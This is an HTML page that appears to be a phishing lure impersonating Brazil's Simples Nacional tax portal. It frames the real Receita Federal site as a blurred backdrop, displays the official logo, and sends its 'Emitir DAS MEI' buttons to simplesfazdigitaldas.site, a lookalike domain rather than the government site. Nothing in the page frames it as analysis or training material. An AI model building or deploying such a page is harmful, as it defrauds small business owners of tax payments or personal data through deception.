<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simples Nacional</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: #0a0a0a;
            height: 2000px;
            position: relative;
            overflow-x: hidden;
        }

        /* Fundo embaçado mais visível */
        .background-blur {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            z-index: 0;
            pointer-events: none;
        }

        .background-blur iframe {
            width: 100%;
            height: 100%;
            border: none;
            /* Reduzi o blur, aumentei brilho e opacidade */
            filter: blur(2px) brightness(0.9) opacity(0.7);
            transform: scale(1.02);
            object-fit: cover;
        }

        /* Card cinza claro */
        .main-card {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 1;
            background: #f0f2f5;
            border: 1px solid #ccc;
            border-radius: 8px;
            padding: 35px 30px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            max-width: 440px;
            width: 90%;
            pointer-events: auto;
        }

        .logo-img {
            width: 140px;
            height: auto;
            margin-bottom: 20px;
        }

        .main-card .subtitle {
            color: #444;
            font-size: 1rem;
            margin-bottom: 30px;
            font-weight: 400;
        }

        .buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
            align-items: center;
        }

        /* Botões verdes (tom original do Simples) */
        .action-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            padding: 12px 20px;
            border-radius: 6px;
            font-size: 1rem;
            font-weight: 600;
            text-decoration: none;
            transition: all 0.2s;
            border: none;
            width: 100%;
            max-width: 240px;
            color: white;
            background: #00b377;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }

        .action-btn:hover {
            background: #009966;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0,179,119,0.4);
        }

        @media (max-width: 600px) {
            .logo-img {
                width: 110px;
            }
        }
    </style>
</head>
<body>
    <div class="background-blur">
        <iframe src="https://www8.receita.fazenda.gov.br/SimplesNacional/"></iframe>
    </div>

    <div class="main-card">
        <img src="https://www8.receita.fazenda.gov.br/SimplesNacional/img/marca_Simples.png" alt="Simples Nacional" class="logo-img">
        <p class="subtitle">Programa Gerador de DAS do Microempreendedor Individual</p>

        <div class="buttons">
            <a href="https://simplesfazdigitaldas.site/?gcl=ium8P8Jh" target="_blank" class="action-btn">
                📄 Emitir DAS MEI
            </a>
            <a href="https://simplesfazdigitaldas.site/?gcl=ium8P8Jh" target="_blank" class="action-btn">
                🌐 Simples Nacional
            </a>
        </div>
    </div>
</body>
</html>
